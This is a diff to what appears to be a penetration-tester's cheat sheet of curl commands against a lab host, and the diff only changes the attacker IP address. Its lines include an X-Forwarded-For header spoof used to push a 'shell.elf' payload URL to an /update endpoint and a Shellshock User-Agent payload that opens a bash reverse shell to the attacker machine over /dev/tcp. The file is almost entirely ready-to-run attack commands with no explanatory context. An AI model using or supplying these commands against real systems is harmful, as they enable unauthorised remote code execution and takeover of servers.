@@ -28,7 +28,7 @@ curl http://192.168.200.5/nodes -d ""
 curl -X POST http://192.168.200.5/nodes
 curl -s -i -X POST -H 'Content-Length: 0' http://192.168.200.5/weird
 curl http://192.168.200.5/update --header "X-Forwarded-For: 127.0.0.1" -X POST
-curl http://192.168.200.5/update --header "X-Forwarded-For: 127.0.0.1" -X POST -H 'Content-Type: application/json' -d '{"user":"bobadmin", "url":"http://192.168.119.154:22/shell.elf"}
+curl http://192.168.200.5/update --header "X-Forwarded-For: 127.0.0.1" -X POST -H 'Content-Type: application/json' -d '{"user":"bobadmin", "url":"http://192.168.162.46:22/shell.elf"}
 curl http://192.168.200.5/restart --header "X-Forwarded-For: 127.0.0.1" -X POST -H 'Content-Type: application/json' -d '{"confirm":"true"}
 
 
@@ -51,4 +51,4 @@ curl -X POST -d @data.json http://192.168.200.5:8080/exhibitor/v1/config/set
 ===================================
 # Shellshock
 
-curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.154/PORT 0>&1' http://192.168.200.5/bad.txt
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.162.46/PORT 0>&1' http://192.168.200.5/bad.txt
